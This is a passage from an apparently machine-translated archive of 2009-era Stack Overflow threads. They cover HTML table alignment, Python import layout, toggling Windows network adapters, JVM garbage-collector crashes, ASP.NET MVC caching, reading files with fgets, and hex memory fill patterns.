                    if ( !type.IsNestedPrivate && !type.IsNestedPublic
                        && !type.IsNestedAssembly  )
                        assy.AddType( type );
            }
        }
        catch ( Exception ex )
        {
            System.Diagnostics.Trace.WriteLine( "Manifest.AddAssembly Exception: " + ex.Message );

            Manager.WriteException(ex);
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-06-14T07:09:57.563

这是由第三方许可库导致的，该库将错误代码注入到进程中。

# html - 如何格式化多个表格以进行垂直对齐

> ID：860671
> 
> 赞同：2
> 
> 时间：2009-05-13T22:05:31.807
> 
> 标签：html, html-table, vertical-alignment

我继承了一些 HTML 代码，并被要求对齐两个表格，以便文本在两列之间对齐。

有一个外部表为这个东西提供两列外观，然后是两个内部表（每列一个）。每个内表都包含保存文本的框。客户希望在两列之间对齐的正是这些文本框。

我可以想出一些方法来使两列中的文本行“匹配”，但没有什么简单或优雅的。

这是html代码：

```
<html>
<head>
    <title>Test</title>
</head>
<body  >
    <table width="100%" border="1" cellspacing="2" cellpadding="0">
    <tr>
    <td width="50%">
        <hr align="left" />
        <p><center><strong>Left Side</strong></center></p>
        <table width="100%" border="1" cellspacing="2" cellpadding="0">
            <tr>
                <td width="5%">
                <strong>1:</strong>
                </td>
                <td width="90%">
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                </td>
            </tr>
            <tr>
                <td width="5%">
                &nbsp;
                </td>
                <td width="90%">
                <hr align="left" />
                </td>
            </tr>
            <tr>
                <td width="5%">
                <strong>2:</strong>
                </td>
                <td width="90%">
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                </td>
            </tr>
            <tr>
                <td width="5%">
                &nbsp;
                </td>
                <td width="90%">
                <hr align="left" />
                </td>
            </tr>
        </table>
    </td>
    <td width="50%">
        <hr align="left" />
        <p><center><strong>Right Side</strong></center></p>
        <table width="100%" border="1" cellspacing="2" cellpadding="0">
            <tr>
                <td width="5%">
                <strong>1:</strong>
                </td>
                <td width="90%">
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                </td>
            </tr>
            <tr>
                <td width="5%">
                &nbsp;
                </td>
                <td width="90%">
                <hr align="left" />
                </td>
            </tr>
            <tr>
                <td width="5%">
                <strong>2:</strong>
                </td>
                <td width="90%">
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                </td>
            </tr>
            <tr>
                <td width="5%">
                &nbsp;
                </td>
                <td width="90%">
                <hr align="left" />
                </td>
            </tr>
        </table>
    </td>
    </tr>
    </table>
</body>
</html> 
```

编辑：进一步澄清和限制这件事。

1.  它是由 servlet 程序创建的，因此两列的顺序是基于循环的。也就是说，一个循环写入第一（左）列，然后另一个循环写入第二（右）列。它们不是“可混合”的循环——它们必须一个接一个地运行，严重限制了我可以对格式进行的操作。

2.  客户端已在 servlet 中指定“无 javascript”。这是一个严格的限制。

我可以使用 CSS，但两个循环（左，右）是固定的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T23:26:29.477

不太确定您在这里想要什么，似乎您希望行根据另一列上的对应行动态调整它们的高度。即左侧的第一行的文本比右侧的第一行长，但是您希望两个第二行开始对齐，在右列的第一行的文本和第二行的文本之间留下一些空白空间在右栏中，对吗？

如果是这种情况，您的解决方案是移除包装表。表已经基于列，因此您不需要额外的表来创建列。

试试这个代码：

```
<html>
<head>
    <title>Test</title>
</head>
<body>
    <table width="100%" border="1" cellspacing="2" cellpadding="0">
        <tr>
            <td colspan="2" width="50%">
                <p><center><strong>Left Side</strong></center></p>
            </td>
            <td colspan="2" width="50%">
                <p><center><strong>Right Side</strong></center></p>
            </td>
        <tr>
        <tr>
            <td width="5%" valign="top">
                        <strong>1:</strong>
            </td>
            <td width="45%" valign="top">
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
           </td>
            <td width="5%" valign="top">
           <strong>1:</strong>
           </td>
           <td width="45%" valign="top">
           blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
           blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
           blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
           blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
           </td>
        </tr>
        <tr>
          <td width="5%">&nbsp;</td>
          <td width="45%">
             <hr align="left" />
          </td>
          <td width="5%"> &nbsp; </td>
          <td width="45%">
          <hr align="left" />
          </td>
        </tr>
        <tr>
          <td width="5%" valign="top">
                        <strong>2:</strong>
          </td>
          <td width="45%" valign="top">
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
                        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        </td>
        <td width="5%" valign="top">
        <strong>2:</strong>
        </td>
        <td width="45%" valign="top">
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah blah
        </td>
     </tr>
     <tr>
       <td width="5%">&nbsp;</td>
       <td width="45%">
           <hr align="left" />
      </td>
      <td width="5%">&nbsp;</td>
      <td width="45%">
        <hr align="left" />
      </td>
   </tr>
  </table>
</body>
</html> 
```

无需说这是一种糟糕且非常老派的方式来做你正在做的事情，你最好使用 div 和 css，但正如你所说，你继承了代码，我明白一点重构不是一种选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T23:18:55.213

如果我理解正确，您希望两个表格的行为表格的每一行调整两个表格中最高行的高度。

我认为唯一的两种方法是：

1.  使用 javascript 计算每个表的每行高度并将它们设置为最高（第 1 行的最高，第 2 行的最高等）。
2.  将两个表合并为一个（最好将三个表合并）。

第二个显然是要走的路，但是如果两个表始终具有相同的行数（但无论如何您都需要）并且您不能更改大部分 html，第一个也应该工作。

除此之外，我认为没有 html / css 解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-14T00:18:40.013

好的，我想我从其他人所说的情况中理解了这个问题。如果您能够自己更改代码（您没有明确说明），那么最快的解决方案是：

*   在外部表上使用多行，即 2 列 x N 行而不是 2x1。
*   将此外部表格的每个单元格设置为垂直居中对齐（这是所有浏览器的默认设置）。
*   在每个单元格内放置一个单独的表格。在同一行中，表格将在中间对齐。

没有任何我能想到的跨浏览器工作的 CSS（即非表格）解决方案。您可以使用`inline-block`，但有一些警告。

# python - 在 Python 中布局导入路径，简单明了？

> ID：860672
> 
> 赞同：2
> 
> 时间：2009-05-13T22:06:46.737
> 
> 标签：python, import

如果一组 Python 开发人员想要将他们的共享代码放在某个地方，以分层结构的形式，那么结构是什么，以及相关的“导入”语法是什么？

java风格的参考是否也适用于Python？即，目录是否对应于点？

仅供内部使用的 Python 代码库的标准设置是什么，从该库区域导入的语法是什么，比如 3 级深度？

我读过Learning Python，看到了PYTHONPATH，几个星期以来一直在摆弄代码，很喜欢它，但我只是对“导入”很感兴趣，而不是琐碎的案例。如果太笼统，请把我送回书本。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T23:13:53.520

我们所做的。

**发展**

*   c:\someroot\project\thing__init__.py # 使事物成为一个包

*   c:\someroot\project\thing\foo.py

*   c:\someroot\project\thing\bar.py

我们的“环境”（以多种方式设置

```
SET PYTHONPATH="C:\someroot\project" 
```

我们正在处理的一些文件

```
 import thing.foo
 import thing.bar 
```

**部署**

*   /opt/someroot/project/project-1.1/thing/ **init** .py # 使事物成为一个包

*   /opt/someroot/project/project-1.1/thing/foo.py

*   /opt/someroot/project/project-1.1/thing/bar.py

我们的“环境”（以多种方式设置

```
SET PYTHONPATH="/opt/someroot/project/project-1.1" 
```

这允许并行部署多个版本。

各种“事物”中的每一个都被设计成独立的、可重复使用的包。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T22:20:40.067

> 如果一组 Python 开发人员想要将他们的共享代码放在某个地方，以分层结构的形式，那么结构是什么，以及相关的“导入”语法是什么？

你把它放在你自己文件夹下的 C:\python26\Lib\site-packages\ 目录中。

在该文件夹中，您应该包含一个 __init__.py 文件，该文件将在导入时运行，该文件可以为空。

> java风格的参考是否也适用于Python？即，目录是否对应于点？

是的，只要目录包含 __init__.py 文件。

> 仅供内部使用的 Python 代码库的标准设置是什么，从该库区域导入的语法是什么，比如 3 级深度？

```
MyCompany/MyProject/ -> import MyCompany.MyProject 
```

# c++ - 以编程方式禁用/启用网络接口

> ID：860673
> 
> 赞同：18
> 
> 时间：2009-05-13T22:07:26.470
> 
> 标签：c++, windows, windows-vista, windows-xp, nic

我正在尝试提出一种以编程方式启用/禁用网卡的解决方案——我已经进行了大量研究，但在 XP 和 Vista 环境中似乎没有什么是可行的解决方案。我在说的是，如果您进入控制面板“网络连接”，右键单击一个并选择启用或禁用。理想情况下，我想使用一个库，但如果情况变得更糟，我想我可以调用一个命令行应用程序，但这绝对是最坏的情况。这是我迄今为止尝试过的以及他们失败的地方/原因：

这个以前的帖子：

[如何以编程方式启用/禁用网络接口？(Windows XP)](https://stackoverflow.com/questions/83756/how-to-programmatically-enabledisable-network-interfaces-windows-xp)

列出了几个方法 - 第一个是使用 netsh，这似乎与使用 IPHelper 函数 SetIfEntry() 相同。问题在于它将接口设置为以管理方式启用或禁用，而不是正常的启用/禁用，因此它实际上并没有关闭 NIC。

提出的另一个解决方案是使用 WMI，特别是 Win32_NetworkAdapter 类，它有一个 Enable 和 Disable 方法：

[http://msdn.microsoft.com/en-us/library/aa394216(VS.85).aspx](http://msdn.microsoft.com/en-us/library/aa394216(VS.85).aspx)

很棒吧？在 Vista 中工作正常，这些方法在普通的 XP 安装中不存在......

另一个建议是使用真正使用 SetupAPI 的 DevCon，特别是带有 DICS_ENABLE 的 SetupDiSetClassInstallParams()。在这个精彩的课程上花费了无数小时，并尝试在全局级别以及特定配置级别（以及每个组合）禁用/启用设备后，它也不能始终如一地工作 - 有时工作正常，但其他时候在设备管理器中禁用设备，但仍将其留在网络连接中并运行。

然后我尝试使用 INetConnection 接口，特别是 INetConnection->Connect/Disconnect：

[http://msdn.microsoft.com/en-us/library/aa365084(VS.85).aspx](http://msdn.microsoft.com/en-us/library/aa365084(VS.85).aspx)

但是我永远无法让这对我的 Vista 或 XP 测试盒上的连接产生任何影响。

最后，我找到了这个名为 ToggleNic 的 C# 脚本：

[http://channel9.msdn.com/playground/Sandbox/154712/](http://channel9.msdn.com/playground/Sandbox/154712/)

看起来它以某种方式通过 Shell 以有效地导致右键单击行为。限制（至少是这个实现）是它在非英语系统上不起作用（未经修改），我需要我来使用它。公平地说，这个解决方案看起来是最可行的，但我对 C# 的熟悉程度很低，而且我找不到它使用的 API 是否在 C++ 中可用。

任何帮助或见解将不胜感激 - 或有关如何完成切换脚本在 C++ 中的作用的想法。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-18T21:44:56.897

在更多平台和更多方法上进行测试后，我基本上已经放弃了这个功能（至少出于我的目的）。对我来说，问题是我想要在 90% 以上的情况下工作，而现实情况是，我能想到的一切都接近 70%。具有讽刺意味的是，它实际上与普通的 Windows 方法一样不稳定。对于那些仍然想走这条危险道路的人，这就是我发现的：

在上述 API 直接方法中，最一致的方法是使用 SetupAPI (SetupDiSetClassInstallParams) - 我遇到的最大问题是，有时它会进入需要重新启动且无需更改的状态工作直到那件事发生。使用它时唯一需要注意的另一件事是设备有两个配置文件，因此在某些情况下您需要同时切换它们。DDK 包含 devcon 工具的源代码，它准确地向您展示了如何做所有事情。这最终看起来像是最接近右键单击，但它仍然表现出一些网络连接没有的奇怪行为。这种方法似乎在大约 70% 的时间内都有效（在测试和测试系统中）。

从整体破解方法中，我发现最好的方法不是使用 ToggleNIC 所做的技术，而是使用 IShellFolder 的东西——这允许您使用与语言无关的 GetCommandString。问题是在 XP 下 GetCommandString 没有返回任何东西（哦，高兴），但似乎“启用”和“禁用”的菜单 ID 是一致的（分别为 16 和 17），所以如果我未能 GetCommandString ，我只是回到菜单 ID 上。要切换，只需调用 InvokeCommand ，如果它返回一个字符串，或者如果它没有返回菜单 ID。这样做的问题是，就像正常的 Windows 方式一样，有时它不起作用，也没有给你任何关于正在发生的事情或失败原因的指示。这种方法似乎在大约 70% 的时间里也有效，

希望这对其他人有所帮助 - 如果有人设法找到另一种适用于更多情况的方法，我很乐意听到它！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-15T10:41:57.973

[在此处](http://www.gershnik.com/faq/manage.asp#enable)尝试“ *Shell Network Interfaces* ”C++ 代码。这应该在 XP 和更高版本下工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-11-05T09:57:57.120

经过大量搜索后，我开始深入研究 DEVCON。在意识到这些方法必须是可调用的之后，我做了一些搜索，发现了这个： http: [//www.codeproject.com/KB/cs/HardwareHelper.aspx](http://www.codeproject.com/KB/cs/HardwareHelper.aspx)

它至少帮助解决了我从 OpenVPN 启用和禁用 TAP 适配器的问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-09-30T18:10:41.010

```
'==========================================================================
' NAME: 1unconnectedNIC.vbs
'
' COMMENT: This file will disable and rename the unconnected NIC on the 
'  local server.
'
' Usage:
'  cscript 1unconnectedNIC.vbs
' Alex John
'==========================================================================
strComputer = "."

Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colAdapters = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapter where NetConnectionStatus = '7'" )

'For every adapter that is disconnected (has a red X by it)
For Each objAdapter in colAdapters
 Wscript.Echo "Net Connection ID: " & objAdapter.NetConnectionID
 Wscript.Echo "....Disabling NIC"

 'Disable the NIC
 objShell.Run "netsh interface set interface name=" & chr(34) & objAdapter.NetConnectionID & chr(34) & " admin=disabled", 0, true
 Wscript.Echo "....NIC Disabled"
 WScript.Sleep 10000

 'Rename the NIC
 Wscript.Echo "....Renaming NIC to 'Not Used'"
 objShell.Run "netsh interface set interface name=" & chr(34) & objAdapter.NetConnectionID & chr(34) & " newname=" & chr(34) & "Not Used" & n & chr(34), 0, true
Next
Wscript.Echo "Finished" 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-01-13T21:00:51.063

```
ManagementClass managementClass = new ManagementClass("Win32_NetworkAdapter");
ManagementObjectCollection mgmtObjectColl = managementClass.GetInstances();

ManagementObject myObject = null;

foreach (ManagementObject mgmtObject in mgmtObjectColl)
{
    if (mgmtObject["NetConnectionID"] != null && mgmtObject["NetConnectionID"].Equals("Local Area Connection"))
    {
        Console.WriteLine("found");
        myObject = mgmtObject;
        object result = mgmtObject.InvokeMethod("Disable", null);
    }
    //Console.WriteLine("{0}, {1}", mgmtObject["Name"], mgmtObject["NetConnectionID"]);
}

object result3 = myObject.InvokeMethod("Enable", null); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-18T08:12:22.343

ToggleNic 通过 COM 使用 Shell32。在 c 中，这由标准库“SHLOBJ.H”“SHELLAPI.H”和 IShellDispatch 类使用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-01-31T06:21:03.927

发现这个基本上是右键单击自动化的解决方案：http: [//www.wilderssecurity.com/showthread.php?](http://www.wilderssecurity.com/showthread.php?t=265836) t= 265836 适用于 Windows XP 和 Windows 7

还有一个是 Novell 写的，它是 DevCon 之上的一个包装器： [http ://www.novell.com/communities/node/2338/network-configuration-command-line-control](http://www.novell.com/communities/node/2338/network-configuration-command-line-control)

# java - Random crashes of Java VM in ConcurrentGCThread

> ID：860676
> 
> 赞同：3
> 
> 时间：2009-05-13T22:08:26.890
> 
> 标签：java, jvm, crash, jdk1.6

We have problems with JVMs running internet applications under changing load. This problem comes and goes. One day we see three VMs dying and after that, there is nothing for a week or two. We have not found a pattern yet, found nothing to reproduce or cause it. Also a search in the Sun bug database did not help.

We tried a suggested workaround (-XX:-CMSPermGenPrecleaningEnabled -XX:-CMSConcurrentMTEnabled) from [http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6354939](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6354939) Did not help. It seem to just change the thread that causes it... or at least make us believe so.

Also an upgrade to 1.6.0_13 did not help and the bug request to Sun never returned a response.

So my question is, has anyone seen that or has an idea what to look for? Could this be related to OS libraries?

Edited: OS is Linux, OpenSuse running on AMD cpus (Linux 2.6.18.8-0.1-dw #3 SMP Thu Mar 15 01:21:48 GMT 2007 x86_64 x86_64 x86_64 GNU/Linux)

```
#
# An unexpected error has been detected by Java Runtime Environment:
#
# SIGSEGV (0xb) at pc=0x062c75f5, pid=6667, tid=1090374560
#
# Java VM: Java HotSpot(TM) Server VM (11.2-b01 mixed mode linux-x86)
# Problematic frame:
# V [libjvm.so+0x2c75f5]
#
# If you would like to submit a bug report, please visit:
# http://java.sun.com/webapps/bugreport/crash.jsp
#

--------------- T H R E A D ---------------

Current thread (0x081ddc00): ConcurrentGCThread [stack: 0x40f5c000,0x40fdd000] [id=6679]

siginfo:si_signo=SIGSEGV: si_errno=0, si_code=1 (SEGV_MAPERR), si_addr=0x0000000c

Registers:
EAX=0x00000000, EBX=0x00000008, ECX=0x0bf5e510, EDX=0x42d6dcb0
ESP=0x40fdc150, EBP=0x40fdc168, ESI=0x40fdc200, EDI=0xa19e9640
EIP=0x062c75f5, CR2=0x0000000c, EFLAGS=0x00210206

Top of Stack: (sp=0x40fdc150)
0x40fdc150: 40fdc200 71c70000 0815a748 0815a704
0x40fdc160: a19e9640 40fdc200 40fdc198 062c74cb
0x40fdc170: 40fdc200 a19e9640 0bf5e510 0bf5e510
0x40fdc180: 080ea6f0 40fdc200 00000010 a19e9640
0x40fdc190: ad38a000 40fdc200 40fdc1c8 0629efaa
0x40fdc1a0: 40fdc200 a19e9640 00000100 00000100
0x40fdc1b0: 0815ab00 40fdc200 40fdc2b8 40fdc200
0x40fdc1c0: 080ea5f0 0815a638 40fdc2b8 062c2905

Instructions: (pc=0x062c75f5)
0x062c75e5: 53 83 ec 0c 8b 7d 0c 8b 75 08 8b 47 04 8d 58 08
0x062c75f5: 8b 53 04 89 d1 c1 f9 02 85 d2 7e 6f b8 04 00 00

Stack: [0x40f5c000,0x40fdd000], sp=0x40fdc150, free space=512k
Native frames: (J=compiled Java code, j=interpreted, Vv=VM code, C=native code)
V [libjvm.so+0x2c75f5]
V [libjvm.so+0x2c74cb]
V [libjvm.so+0x29efaa]
V [libjvm.so+0x2c2905]
V [libjvm.so+0x2bb461]
V [libjvm.so+0x2c9ef5]
V [libjvm.so+0x506929]
C [libpthread.so.0+0x52ab] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2010-12-23T10:45:16.763

我有一个非常相似的 JVM 转储。原因是 Solaris 区域中缺少内存/交换空间。在 64 位模式下运行相同的程序（即使用 Java 选项 -d64），错误更加明确：

`A fatal error has been detected by the Java Runtime Environment:`

`java.lang.OutOfMemoryError: requested 395856 bytes for Chunk::new. Out of swap space?`

`Internal Error (allocation.cpp:272), pid=10847, tid=32 Error: Chunk::new`

`JRE version: 6.0_23-b05 Java VM: Java HotSpot(TM) 64-Bit Server VM (19.0-b09 mixed mode solaris-sparc compressed oops) If you would like to submit a bug report, please visit: [http://java.sun.com/webapps/bugreport/crash.jsp](http://java.sun.com/webapps/bugreport/crash.jsp)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-10-27T18:54:08.540

自 6u13 以来，已经修复了几个与 GC 崩溃相关的错误。这里有一些：

*   [6897143](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6897143) - 使用 ParallelGC 在 HeapInspection 期间压力测试崩溃。
*   [6845368](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6845368) - 大对象导致崩溃或意外异常
*   [6840775](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6840775) - 通过 1.6.0_14 的早期访问在 1.6.0_10 中看到多个 JVM 崩溃 - 可能与 GC 有关
*   [6806226](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6806226) - 可增长数组代码中的有符号整数溢出导致 JVM 崩溃

我建议至少使用 Java 6 Update 18 (u18)。

# asp.net-mvc - 如何在 ASP.NET MVC 中禁用客户端和代理缓存？

> ID：860678
> 
> 赞同：27
> 
> 时间：2009-05-13T22:08:53.953
> 
> 标签：asp.net-mvc

在 ASP.NET MVC 中禁用页面缓存的正确（与浏览器无关）方法是什么？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2009-05-13T23:46:49.113

试试这个：

```
[OutputCache(NoStore = true, Duration = 0, VaryByParam = "*")]
public ActionResult NonCacheableData()
{
    return View();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-07-18T20:04:39.707

如果您的 MVC 操作返回 JSON 而不是 HTML，例如在 ajax 调用中，则不能使用元标记方法。

# c++ - 使用 fgets() 从文件读取会导致“从地址读取访问冲突...” c++

> ID：860685
> 
> 赞同：2
> 
> 时间：2009-05-13T22:13:05.633
> 
> 标签：c++, c, file

我正在使用在 _sfopen () 中打开的 FILE * F 我在 while(!feof(f)) 中读取文件，然后在运行到达最后一行时读取 fgets(str,1024,f) 它仍然在 while但是当尝试 fgets 时，它会因访问冲突错误而飞出（虽然我只是尝试并 catch(...) 但我知道这不是一个好的解决方案）我应该改变什么来解决问题？

另外-如果我想逐行读取是否正确给出 1024 的大小或它可能会失败-我有一个文件，由于它每次从一行中间到下一行中间读取的大小行 - 有没有更好的方法来读取一行，因为我不知道我的文件会是什么样子（如果结尾有 \n 等等......）

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T23:18:46.603

如果您在 之前没有阅读，`while(!feof(f))`那么它会被破坏，因为 EOF 标志直到读取完成**后才会设置。**而是做这样的事情：

```
char buf[1024];
while(fgets(buf, sizeof(buf), f)) {
    /* process the line */
} 
```

由于 fgets 被定义为在读取失败或 EOF 时返回 NULL。

如果您在 c++ 中执行此操作，那么我建议使用类似的模式（但使用 c++ iostreams 代替）。

```
std::ifstream file("filename.txt");
std::string line;
while(std::getline(file, line)) {
    // process the line
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:42:47.627

您将 C++ 指定为标记，可能使用文件流（std::ifstream 用于文件输入）和全局[getline()](http://www.cplusplus.com/reference/iostream/istream/getline/)函数逐行获取它并将其放入 std::string 中以供进一步分析/操作。

看[这里](http://www.cplusplus.com/doc/tutorial/files/)的例子（“文本文件”段落中的第二个例子）

# memory - 有用于填充的十六进制“名称”生成器？

> ID：860688
> 
> 赞同：6
> 
> 时间：2009-05-13T22:13:28.317
> 
> 标签：memory, hex

前几天我在调试时遇到了一些我以前在我正在使用的嵌入式硬件上从未见过的内存和寄存器填充。所以我开始了一个心理目录。例如：

```
DEADBEEF, BAADF00D, D15EA5ED, DECEA5ED, BAA5H33P... 
```

